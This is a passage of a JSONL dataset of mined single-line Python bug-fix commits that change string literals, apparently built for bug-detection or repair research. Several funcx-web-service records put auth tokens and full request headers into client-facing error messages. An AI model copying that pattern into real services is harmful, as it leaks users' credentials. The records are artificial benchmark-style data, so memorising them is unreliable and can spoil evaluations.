{token} , {request.headers}\" )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:f\\\"Error: You must be logged in to perform this function. {token}\\\"\", 3, 32, 3, 97], \"f\\\"Error: You must be logged in to perform this function. {token} , {request.headers}\\\"\"]]"}
{"project": "funcx-web-service", "commit_sha": "64c7f668802523a43f50346c15dcd41fe6e7101e", "parent_sha": "ebc8378b553d47cbc62fa338a5e358fccf0579c9", "file_path": "api/api.py", "project_url": "https://github.com/funcx-faas/funcx-web-service", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -99,7 +99,7 @@ def status(task_id):\n         token = request.headers.get('Authorization')\n         token = token.split(\" \")[1]\n     else:\n-        abort(400, description=\"Error: You must be logged in to perform this function.\")\n+        abort(400, description=\"Error: You must be logged in to perform this function. {request.headers}\")\n \n     if caching and token in token_cache:\n         user_name = token_cache[token]\n", "before": "else : abort ( 400 , description = \"Error: You must be logged in to perform this function.\" )", "after": "else : abort ( 400 , description = \"Error: You must be logged in to perform this function. {request.headers}\" )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"Error: You must be logged in to perform this function.\\\"\", 3, 32, 3, 88], \"\\\"Error: You must be logged in to perform this function. {request.headers}\\\"\"]]"}
{"project": "funcx-web-service", "commit_sha": "1a1f8397aa484690faa69032e1f80c35fb5c3544", "parent_sha": "64c7f668802523a43f50346c15dcd41fe6e7101e", "file_path": "api/api.py", "project_url": "https://github.com/funcx-faas/funcx-web-service", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -99,7 +99,7 @@ def status(task_id):\n         token = request.headers.get('Authorization')\n         token = token.split(\" \")[1]\n     else:\n-        abort(400, description=\"Error: You must be logged in to perform this function. {request.headers}\")\n+        abort(400, description=f\"Error: You must be logged in to perform this function. {request.headers}\")\n \n     if caching and token in token_cache:\n         user_name = token_cache[token]\n", "before": "else : abort ( 400 , description = \"Error: You must be logged in to perform this function. {request.headers}\" )", "after": "else : abort ( 400 , description = f\"Error: You must be logged in to perform this function. {request.headers}\" )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"Error: You must be logged in to perform this function. {request.headers}\\\"\", 3, 32, 3, 106], \"f\\\"Error: You must be logged in to perform this function. {request.headers}\\\"\"]]"}
{"project": "mitmproxy", "commit_sha": "c4c42fa040f4e0177516e9830591ca36a3660f3f", "parent_sha": "ce18cd8ba40998c0654e697efcc0a0f018e45375", "file_path": "test/test_protocol_http.py", "project_url": "https://github.com/aisier/mitmproxy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -70,7 +70,7 @@ class TestHTTPRequest:\n \n     def test_http_options_relative_form_in(self):\n         \"\"\"\n-        Exercises fix for Issue #xxx.\n+        Exercises fix for Issue #392.\n         \"\"\"\n         s = StringIO(\"OPTIONS /secret/resource HTTP/1.1\")\n         r = HTTPRequest.from_stream(s)\n", "before": "\"\"\"\n         Exercises fix for Issue #xxx.\n         \"\"\"", "after": "\"\"\"\n         Exercises fix for Issue #392.\n         \"\"\"", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"\\\"\\\"\\n         Exercises fix for Issue #xxx.\\n         \\\"\\\"\\\"\", 2, 9, 4, 12], \"\\\"\\\"\\\"\\n         Exercises fix for Issue #392.\\n         \\\"\\\"\\\"\"]]"}
{"project": "msglite", "commit_sha": "040c01fb3d6bd0d8d95fc0ea6465134817e5173a", "parent_sha": "d4d5087f2f8d0f6f222d8862460272821eeb65e8", "file_path": "extract_msg/message.py", "project_url": "https://github.com/alephdata/msglite", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -232,7 +232,7 @@ class Message(olefile.OleFileIO):\n                 header.add_header('Cc', self.cc)\n                 header.add_header('Message-Id', self.message_id)\n                 # TODO find authentication results outside of header\n-                header.add_header('Authenitcation-Results', None)\n+                header.add_header('Authentication-Results', None)\n \n                 self._header = header\n             return self._header\n", "before": "header . add_header ( 'Authenitcation-Results' , None )", "after": "header . add_header ( 'Authentication-Results' , None )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'Authenitcation-Results'\", 3, 35, 3, 59], \"'Authentication-Results'\"]]"}
{"project": "vision", "commit_sha": "ef77152818104c5102801fe5354c1f2d9d5d8c2d", "parent_sha": "d5c7cc9e8199152d7f0546743ff3d27300239fa8", "file_path": "deliravision/models/gans/info/info_gan.py", "project_url": "https://github.com/delira-dev/vision", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -217,7 +217,7 @@ class InfoGAN(AbstractPyTorchNetwork):\n         return {\n             \"data\": torch.from_numpy(batch[\"data\"]).to(torch.float).to(\n                 input_device),\n-            \"label\": torch.from_numpy(batch[\"data\"]).to(torch.long).to(\n+            \"label\": torch.from_numpy(batch[\"label\"]).to(torch.long).to(\n                 input_device\n             )\n         }\n", "before": "return { \"data\" : torch . from_numpy ( batch [ \"data\" ] ) . to ( torch . float ) . to ( input_device ) , \"label\" : torch . from_numpy ( batch [ \"data\" ] ) . to ( torch . long ) . to ( input_device ) }", "after": "return { \"data\" : torch . from_numpy ( batch [ \"data\" ] ) . to ( torch . float ) . to ( input_device ) , \"label\" : torch . from_numpy ( batch [ \"label\" ] ) . to ( torch . long ) . to ( input_device ) }", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"data\\\"\", 3, 45, 3, 51], \"\\\"label\\\"\"]]"}
{"project": "echronos-sandbox", "commit_sha": "d1486d073f81e6d4f1a7df427fe4e2049422eea2", "parent_sha": "d1b7956d1a1d79102b5d239331a59e8adeeda01e", "file_path": "prj/app/prj.py", "project_url": "https://github.com/schnommus/echronos-sandbox", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1330,7 +1330,7 @@ def call_system_function(args, function, extra_args=None, sys_is_path=False):\n         logger.error(\"Unable to load system [{}].\".format(system_name))\n         return 1\n     except EntityNotFound:\n-        logger.error(\"Unable to  system [{}].\".format(system_name))\n+        logger.error(\"Unable to find system [{}].\".format(system_name))\n         return 1\n \n     if args.output:\n", "before": "EntityNotFound : logger . error ( \"Unable to  system [{}].\" . format ( system_name ) )", "after": "EntityNotFound : logger . error ( \"Unable to find system [{}].\" . format ( system_name ) )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"Unable to  system [{}].\\\"\", 3, 22, 3, 47], \"\\\"Unable to find system [{}].\\\"\"]]"}
{"project": "autodynatrace", "commit_sha": "2e83a09c2cd6e28ca09c05cf22329d9f3481eb3c", "parent_sha": "11b73a8e37dfa49847932c443dda0df7b4ce7fb5", "file_path": "autodynatrace/wrappers/flask/wrapper.py", "project_url": "https://github.com/dlopes7/autodynatrace", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -18,7 +18,7 @@ def instrument():\n             app_name = flask.current_app.name\n \n             dt_headers = None\n-            if env.get(\"DT_CAPTURE_HEADERS\", False):\n+            if env.get(\"AUTODYNATRACE_CAPTURE_HEADERS\", False):\n                 dt_headers = dict(flask.request.headers)\n             wappinfo = sdk.create_web_application_info(\"{}\".format(host), \"Flask ({})\".format(app_name), \"/\")\n \n", "before": "if env . get ( \"DT_CAPTURE_HEADERS\" , False ) : dt_headers = dict ( flask . request . headers )", "after": "if env . get ( \"AUTODYNATRACE_CAPTURE_HEADERS\" , False ) : dt_headers = dict ( flask . request . headers )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"DT_CAPTURE_HEADERS\\\"\", 3, 24, 3, 44], \"\\\"AUTODYNATRACE_CAPTURE_HEADERS\\\"\"]]"}
{"project": "funcx-web-service", "commit_sha": "8e0fae36e29b6e0dabbd0ed6acf4068c6e80776f", "parent_sha": "0b4d7749a9a0852e5a4de228eb18c6aa0b857c7c", "file_path": "routes/funcx.py", "project_url": "https://github.com/funcx-faas/funcx-web-service", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -97,7 +97,7 @@ def submit(user_name):\n         container_uuid = 'RAW'\n \n     if not serializer:\n-        serializer = \"JSON\"\n+        serializer = \"ANY\"\n \n     task_header = f\"{task_id};{container_uuid};{serializer}\"\n \n", "before": "serializer = \"JSON\"", "after": "serializer = \"ANY\"", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"JSON\\\"\", 3, 22, 3, 28], \"\\\"ANY\\\"\"]]"}
{"project": "funcx-web-service", "commit_sha": "57a37c78bf277efb319d1a87adf51a02dcb326a1", "parent_sha": "97883c0026d291024fe057d59a1b77fd8b40f9d9", "file_path": "models/utils.py", "project_url": "https://github.com/funcx-faas/funcx-web-service", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -23,7 +23,7 @@ def create_task(user_id, task_id, function_id, endpoint_id):\n         status = 'CREATED'\n         conn, cur = get_db_connection()\n         query = \"INSERT INTO tasks (user_id, task_id, function_id, endpoint_id, \" \\\n-                \"created_at, modified_at, status) values (%s, %s, %s, %s, %s, %s, %s);\"\n+                \"status) values (%s, %s, %s, %s, %s);\"\n         cur.execute(query, (user_id, task_id, function_id, endpoint_id, status))\n \n         conn.commit()\n", "before": "query = \"INSERT INTO tasks (user_id, task_id, function_id, endpoint_id, \" \"created_at, modified_at, status) values (%s, %s, %s, %s, %s, %s, %s);\"", "after": "query = \"INSERT INTO tasks (user_id, task_id, function_id, endpoint_id, \" \"status) values (%s, %s, %s, %s, %s);\"", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"created_at, modified_at, status) values (%s, %s, %s, %s, %s, %s, %s);\\\"\", 3, 17, 3, 88], \"\\\"status) values (%s, %s, %s, %s, %s);\\\"\"]]"}
{"project": "funcx-web-service", "commit_sha": "9c7b49a6f9079dbf3315fda23f5b2989e5689697", "parent_sha": "a0086b9dbb776dec6658273e9e78ed2b98903e4f", "file_path": "routes/funcx.py", "project_url": "https://github.com/funcx-faas/funcx-web-service", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -115,7 +115,7 @@ def auth_and_launch(user_id, function_uuid, endpoints, input_data, app, token, s\n         task_ids.append(task_id)\n \n     return jsonify({'status': 'Success',\n-                    'task_uuid': task_ids})\n+                    'task_uuids': task_ids})\n \n \n @funcx_api.route('/submit_batch', methods=['POST'])\n", "before": "return jsonify ( { 'status' : 'Success' , 'task_uuid' : task_ids } )", "after": "return jsonify ( { 'status' : 'Success' , 'task_uuids' : task_ids } )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'task_uuid'\", 3, 21, 3, 32], \"'task_uuids'\"]]"}
{"project": "OpenNMT-entmax", "commit_sha": "e4501e32bfc2711b52d83d99bb4487fa376a4e48", "parent_sha": "aca9a58e815057a83f1d1678acbd6986fbca1574", "file_path": "onmt/opts.py", "project_url": "https://github.com/deep-spin/OpenNMT-entmax", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -290,7 +290,7 @@ def train_opts(parser):\n                        help=\"Fix word embeddings on the encoder side.\")\n     group.add_argument('-fix_word_vecs_dec',\n                        action='store_true',\n-                       help=\"Fix word embeddings on the encoder side.\")\n+                       help=\"Fix word embeddings on the decoder side.\")\n \n     # Optimization options\n     group = parser.add_argument_group('Optimization- Type')\n", "before": "help = \"Fix word embeddings on the encoder side.\" ) group . add_argument ( '-fix_word_vecs_dec' , action = 'store_true' , help = \"Fix word embeddings on the encoder side.\" )", "after": "help = \"Fix word embeddings on the encoder side.\" ) group . add_argument ( '-fix_word_vecs_dec' , action = 'store_true' , help = \"Fix word embeddings on the decoder side.\" )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"Fix word embeddings on the encoder side.\\\"\", 3, 29, 3, 71], \"\\\"Fix word embeddings on the decoder side.\\\"\"]]"}
{"project": "OpenNMT-entmax", "commit_sha": "7ac13de5bf1ec3eca3e36f3c6d564d4caff3d474", "parent_sha": "6f8ad70214dee0e34bf9fc5aad51879ff384d086", "file_path": "tools/test_rouge.py", "project_url": "https://github.com/deep-spin/OpenNMT-entmax", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -38,7 +38,7 @@ def test_rouge(cand, ref):\n         r.model_dir = tmp_dir + \"/reference/\"\n         r.system_dir = tmp_dir + \"/candidate/\"\n         r.model_filename_pattern = 'ref.#ID#.txt'\n-        r.system_filename_pattern = 'cand.(\\d+).txt'\n+        r.system_filename_pattern = r'cand.(\\d+).txt'\n         rouge_results = r.convert_and_evaluate()\n         results_dict = r.output_to_dict(rouge_results)\n         return results_dict\n", "before": "r . system_filename_pattern = 'cand.(\\d+).txt'", "after": "r . system_filename_pattern = r'cand.(\\d+).txt'", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'cand.(\\\\d+).txt'\", 3, 37, 3, 53], \"r'cand.(\\\\d+).txt'\"]]"}
{"project": "OpenNMT-entmax", "commit_sha": "b955f53e1994e619b79383db496e27fec7738838", "parent_sha": "970b049ac0f8f8339ecf444fd20d4eb0b8c4d6c9", "file_path": "onmt/modules/GlobalAttention.py", "project_url": "https://github.com/deep-spin/OpenNMT-entmax", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -38,7 +38,7 @@ class GlobalAttention(nn.Module):\n-    def __init__(self, dim, coverage=False, attn_type=\"dotprod\"):\n+    def __init__(self, dim, coverage=False, attn_type=\"dot\"):\n         super(GlobalAttention, self).__init__()\n \n         self.dim = dim\n", "before": "def __init__ ( self , dim , coverage = False , attn_type = \"dotprod\" ) : super ( GlobalAttention , self ) . __init__ ( ) self . dim = dim", "after": "def __init__ ( self , dim , coverage = False , attn_type = \"dot\" ) : super ( GlobalAttention , self ) . __init__ ( ) self . dim = dim", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"dotprod\\\"\", 0, 55, 0, 64], \"\\\"dot\\\"\"]]"}
{"project": "weather_display", "commit_sha": "2307f923ef6dde0ceaffa50b1e452f03fb24a13b", "parent_sha": "350b0b47db992abf5229ebb8d095eb63c2a7fcca", "file_path": "weather_display.py", "project_url": "https://github.com/NeonSpork/weather_display", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -127,7 +127,7 @@ def parseJsonAndDrawToMask():\n     currentStatus = legend[iconStatus]['desc_en']\n     rainChancePercent = stats[0]['data']['next_1_hours']['details']['probability_of_precipitation']\n \n-    conditionIcon = Image.open('icons/weatherIcons{}.png'.format(currentIcon))\n+    conditionIcon = Image.open('icons/weatherIcons/{}.png'.format(currentIcon))\n     refreshIcon = Image.open('icons/refresh.png')\n     windIcon = Image.open('icons/windicon.png')\n     rainLine = Image.open('icons/rainline.png')\n", "before": "conditionIcon = Image . open ( 'icons/weatherIcons{}.png' . format ( currentIcon ) )", "after": "conditionIcon = Image . open ( 'icons/weatherIcons/{}.png' . format ( currentIcon ) )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'icons/weatherIcons{}.png'\", 3, 32, 3, 58], \"'icons/weatherIcons/{}.png'\"]]"}
{"project": "openCEM", "commit_sha": "218f19c5802eddc33ab990717f7795aa35795fcb", "parent_sha": "8659961f7fc868b2aa1bc334ce98db4b814b3872", "file_path": "cemo/multi.py", "project_url": "https://github.com/openCEMorg/openCEM", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -920,7 +920,7 @@ group by zones,all_tech;\" : [zones,all_tech] hyb_cap_initial;\n                 printstats(inst)  # REVIEW this summary printing is slow compared to parquet summary\n             [cdu, cost] = Summary(self.wrkdir, [i for i in self.Years if i <= y], cache=False).get_summary()\n             cdu.to_csv(self.wrkdir/(\"cdeu.zip\"), compression={'method': 'zip', 'archive_name': 'cdeu.csv'})\n-            cost.to_csv(self.wrkdir/(\"cost.zip\"), compression={'mehthod': 'zip', 'archive_name': 'cost.csv'})\n+            cost.to_csv(self.wrkdir/(\"cost.zip\"), compression={'method': 'zip', 'archive_name': 'cost.csv'})\n \n             del inst  # to keep memory down\n         if self.json_output:\n", "before": "cost . to_csv ( self . wrkdir / ( \"cost.zip\" ) , compression = { 'mehthod' : 'zip' , 'archive_name' : 'cost.csv' } )", "after": "cost . to_csv ( self . wrkdir / ( \"cost.zip\" ) , compression = { 'method' : 'zip' , 'archive_name' : 'cost.csv' } )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'mehthod'\", 3, 64, 3, 73], \"'method'\"]]"}
{"project": "mopidy-youtube", "commit_sha": "cec4d2992553dea7746e9851d071330731d03650", "parent_sha": "7f5cd229ea4685c34857a4cab9b53569e932f8c4", "file_path": "mopidy_youtube/youtube.py", "project_url": "https://github.com/natumbri/mopidy-youtube", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -73,7 +73,7 @@ class Entry(object):\n             if item['id']['kind'] == 'youtube#video':\n                 obj = Video.get(item['id']['videoId'])\n                 if 'contentDetails' in item:\n-                    set_api_data.append('lenght')\n+                    set_api_data.append('length')\n             elif item['id']['kind'] == 'youtube#playlist':\n                 obj = Playlist.get(item['id']['playlistId'])\n                 if 'contentDetails' in item:\n", "before": "set_api_data . append ( 'lenght' )", "after": "set_api_data . append ( 'length' )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'lenght'\", 3, 41, 3, 49], \"'length'\"]]"}
{"project": "mopidy-youtube", "commit_sha": "2bc6338cb2933cd4df2f67ee5dce42f1e4f9eaea", "parent_sha": "f3894de618becfafb5c6db296c55c9b4fd73d40a", "file_path": "mopidy_youtube/youtube.py", "project_url": "https://github.com/natumbri/mopidy-youtube", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -73,7 +73,7 @@ class Entry(object):\n             if item['id']['kind'] == 'youtube#video':\n                 obj = Video.get(item['id']['videoId'])\n                 if 'contentDetails' in item:\n-                    set_api_data.append('lenght')\n+                    set_api_data.append('length')\n             elif item['id']['kind'] == 'youtube#playlist':\n                 obj = Playlist.get(item['id']['playlistId'])\n                 if 'contentDetails' in item:\n", "before": "set_api_data . append ( 'lenght' )", "after": "set_api_data . append ( 'length' )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'lenght'\", 3, 41, 3, 49], \"'length'\"]]"}
{"project": "mopidy-youtube", "commit_sha": "08409967c4c65c6ab8bd8cd42a8614326316114a", "parent_sha": "e47f679c208c8a4ef98a900f33ab87524cb0dd41", "file_path": "mopidy_youtube/youtube.py", "project_url": "https://github.com/natumbri/mopidy-youtube", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -73,7 +73,7 @@ class Entry(object):\n             if item['id']['kind'] == 'youtube#video':\n                 obj = Video.get(item['id']['videoId'])\n                 if 'contentDetails' in item:\n-                    set_api_data.append('lenght')\n+                    set_api_data.append('length')\n             elif item['id']['kind'] == 'youtube#playlist':\n                 obj = Playlist.get(item['id']['playlistId'])\n                 if 'contentDetails' in item:\n", "before": "set_api_data . append ( 'lenght' )", "after": "set_api_data . append ( 'length' )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'lenght'\", 3, 41, 3, 49], \"'length'\"]]"}
{"project": "QCG-PilotJob", "commit_sha": "ce409cb5d45ed1c76140d3ccec62846559e20cb0", "parent_sha": "71a12458a2a5b0b3db03de991370608338406d4f", "file_path": "src/qcg/pilotjob/executor.py", "project_url": "https://github.com/vecma-project/QCG-PilotJob", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -167,7 +167,7 @@ class Executor:\n             exec_job = next(exec_job for exec_job in self._not_finished.values() if exec_job.job_iteration.job == job and exec_job.job_iteration.iteration == iteration)\n             _logger.info(f'found execution job to cancel')\n         except StopIteration:\n-            _logger.error(f'iteration to cancel {job_iteration.name} not found in executor')\n+            _logger.error(f'iteration to cancel {job.name}:{iteration} not found in executor')\n             raise InternalError('iteration to cancel not found')\n \n         asyncio.ensure_future(exec_job.cancel())\n", "before": "StopIteration : _logger . error ( f'iteration to cancel {job_iteration.name} not found in executor' )", "after": "StopIteration : _logger . error ( f'iteration to cancel {job.name}:{iteration} not found in executor' )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:f'iteration to cancel {job_iteration.name} not found in executor'\", 3, 27, 3, 92], \"f'iteration to cancel {job.name}:{iteration} not found in executor'\"]]"}
{"project": "QCG-PilotJob", "commit_sha": "aa2f285c8c642d584039f30d00214ddb082a3c06", "parent_sha": "5bb5a3f814626254bbdb2723646a47a9f9dcc92b", "file_path": "src/qcg/pilotjob/executor.py", "project_url": "https://github.com/vecma-project/QCG-PilotJob", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -166,7 +166,7 @@ class Executor:\n             exec_job = next(exec_job for exec_job in self._not_finished.values() if exec_job.job_iteration.job == job and exec_job.job_iteration.iteration == iteration)\n             _logger.info(f'found execution job to cancel')\n         except StopIteration:\n-            _logger.error(f'iteration to cancel {job_iteration.name} not found in executor')\n+            _logger.error(f'iteration to cancel {job.name}:{iteration} not found in executor')\n             raise InternalError('iteration to cancel not found')\n \n         asyncio.ensure_future(exec_job.cancel())\n", "before": "StopIteration : _logger . error ( f'iteration to cancel {job_iteration.name} not found in executor' )", "after": "StopIteration : _logger . error ( f'iteration to cancel {job.name}:{iteration} not found in executor' )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:f'iteration to cancel {job_iteration.name} not found in executor'\", 3, 27, 3, 92], \"f'iteration to cancel {job.name}:{iteration} not found in executor'\"]]"}
{"project": "QCG-PilotJob", "commit_sha": "7c9346d93f0b5d8cf4f9ee87166298c256f8522e", "parent_sha": "aa2f285c8c642d584039f30d00214ddb082a3c06", "file_path": "src/qcg/pilotjob/cmds/processes.py", "project_url": "https://github.com/vecma-project/QCG-PilotJob", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -74,7 +74,7 @@ def read_logs(wdir, verbose):\n \n     stats = JobsReportStats(jobs_report_paths).job_stats()\n     if verbose:\n-        print(f'job report file \"{jobs_report_path}\" read')\n+        print(f'job report file \"{jobs_report_paths}\" read')\n \n     procs = ProcTraces(proc_traces_paths)\n \n", "before": "print ( f'job report file \"{jobs_report_path}\" read' )", "after": "print ( f'job report file \"{jobs_report_paths}\" read' )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:f'job report file \\\"{jobs_report_path}\\\" read'\", 3, 15, 3, 59], \"f'job report file \\\"{jobs_report_paths}\\\" read'\"]]"}
{"project": "py2exe", "commit_sha": "93f0916a37a5de373bd2a1b3704bafcca6a72077", "parent_sha": "558e6dbcd5a2f01143eb0e1ee8cdb629a6e3dd7c", "file_path": "py2exe/mf34.py", "project_url": "https://github.com/albertosottile/py2exe", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -243,7 +243,7 @@ class ModuleFinder:\n         self._depgraph[name].add(caller)\r\n \r\n         if name in self.excludes:\r\n-            raise ImportError('No module named {!r}'.format(name), name=name)\r\n+            raise ImportError('Moduke {!r} is explicitely required but is in the \"excludes\" list!'.format(name), name=name)\r\n \r\n         if name in self.modules:\r\n             return self.modules[name]\r\n", "before": "raise ImportError ( 'No module named {!r}' . format ( name ) , name = name )", "after": "raise ImportError ( 'Moduke {!r} is explicitely required but is in the \"excludes\" list!' . format ( name ) , name = name )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'No module named {!r}'\", 3, 31, 3, 53], \"'Moduke {!r} is explicitely required but is in the \\\"excludes\\\" list!'\"]]"}
{"project": "pake", "commit_sha": "b2d059fa31e66a44163483ec0b57196ba3eb7cef", "parent_sha": "5fc37ddce06965e061217c5ce0a21a8ebbecb06a", "file_path": "pake/program.py", "project_url": "https://github.com/Teriks/pake", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -101,7 +101,7 @@ def init(stdout=None, args=None):\n \n             if type(parsed_stdin_defines) != dict:\n                 print('The --stdin-defines option expects that a python dictionary '\n-                      'object be written to stdin.  A literal of type {} was '\n+                      'object be written to stdin.  A literal of type \"{}\" was '\n                       'deserialized instead.'.format(type(parsed_stdin_defines).__name__),\n                       file=pake.conf.stderr)\n \n", "before": "print ( 'The --stdin-defines option expects that a python dictionary ' 'object be written to stdin.  A literal of type {} was ' 'deserialized instead.' . format ( type ( parsed_stdin_defines ) . __name__ ) , file = pake . conf . stderr )", "after": "print ( 'The --stdin-defines option expects that a python dictionary ' 'object be written to stdin.  A literal of type \"{}\" was ' 'deserialized instead.' . format ( type ( parsed_stdin_defines ) . __name__ ) , file = pake . conf . stderr )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'object be written to stdin.  A literal of type {} was '\", 3, 23, 3, 79], \"'object be written to stdin.  A literal of type \\\"{}\\\" was '\"]]"}
{"project": "pake", "commit_sha": "0a547d67bd8ce868999bb52cd1fed0c25482f53c", "parent_sha": "b19d7dd9f65557bbd8d6dddd96583a2a1f322a4e", "file_path": "pake/arguments.py", "project_url": "https://github.com/Teriks/pake", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -109,7 +109,7 @@ def _validate_arguments(parsed_args):\n             return True, returncodes.BAD_ARGUMENTS\n \n         if parsed_args.show_task_info:\n-            print('-t/--show-task-info and --stdin-defines cannot be used together.',\n+            print('-ti/--show-task-info and --stdin-defines cannot be used together.',\n                   file=pake.conf.stderr)\n             return True, returncodes.BAD_ARGUMENTS\n \n", "before": "print ( '-t/--show-task-info and --stdin-defines cannot be used together.' , file = pake . conf . stderr )", "after": "print ( '-ti/--show-task-info and --stdin-defines cannot be used together.' , file = pake . conf . stderr )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'-t/--show-task-info and --stdin-defines cannot be used together.'\", 3, 19, 3, 85], \"'-ti/--show-task-info and --stdin-defines cannot be used together.'\"]]"}
{"project": "shop-db2", "commit_sha": "a8915e064a55bb250eadf660916134316319263a", "parent_sha": "72e5d3ee3480e2c2ef025ad4e6a03c9b3fb9742e", "file_path": "tests/test_api_delete_tag.py", "project_url": "https://github.com/g3n35i5/shop-db2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -46,6 +46,6 @@ class DeleteTagAPITestCase(BaseAPITestCase):\n \n     def test_delete_non_existing_tag(self):\n         \"\"\"Delete a non existing tag.\"\"\"\n-        res = self.delete(url='/tags/4', role='admin')\n+        res = self.delete(url='/tags/5', role='admin')\n         self.assertEqual(res.status_code, 401)\n         self.assertException(res, exc.TagNotFound)\n", "before": "res = self . delete ( url = '/tags/4' , role = 'admin' )", "after": "res = self . delete ( url = '/tags/5' , role = 'admin' )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'/tags/4'\", 3, 31, 3, 40], \"'/tags/5'\"]]"}
{"project": "shop-db2", "commit_sha": "34be9481edfc01d267cafe516ee76a431634e9d2", "parent_sha": "446762f05a8d8ef7d34a1b0a837812fcdf5d9d05", "file_path": "shopdb/helpers/query.py", "project_url": "https://github.com/g3n35i5/shop-db2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -86,7 +86,7 @@ class QueryFromRequestParameters:\n-        regex_sanitize_pattern = r\"[a-zA-Z0-9\\s]*\"\n+        regex_sanitize_pattern = r\"[a-zA-Z0-9\\s\\-]*\"\n         try:\n             # Validate filter(s)\n             if self.filters is not None:\n", "before": "regex_sanitize_pattern = r\"[a-zA-Z0-9\\s]*\"", "after": "regex_sanitize_pattern = r\"[a-zA-Z0-9\\s\\-]*\"", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:r\\\"[a-zA-Z0-9\\\\s]*\\\"\", 0, 34, 0, 51], \"r\\\"[a-zA-Z0-9\\\\s\\\\-]*\\\"\"]]"}
{"project": "sympy", "commit_sha": "1c78b74acd068203fce7aea95153f8898f200f83", "parent_sha": "2b7bd7a4b1ec389bcbc56ab4f0a45a4befa4b97d", "file_path": "sympy/tensor/tests/test_indexed.py", "project_url": "https://github.com/schymans/sympy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -229,7 +229,7 @@ def test_Indexed_subs():\n def test_Indexed_properties():\n     i, j = symbols('i j', integer=True)\n     A = Indexed('A', i, j)\n-    assert A.name == 'A[i,j]'\n+    assert A.name == 'A[i, j]'\n     assert A.rank == 2\n     assert A.indices == (i, j)\n     assert A.base == IndexedBase('A')\n", "before": "assert A . name == 'A[i,j]'", "after": "assert A . name == 'A[i, j]'", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'A[i,j]'\", 3, 22, 3, 30], \"'A[i, j]'\"]]"}
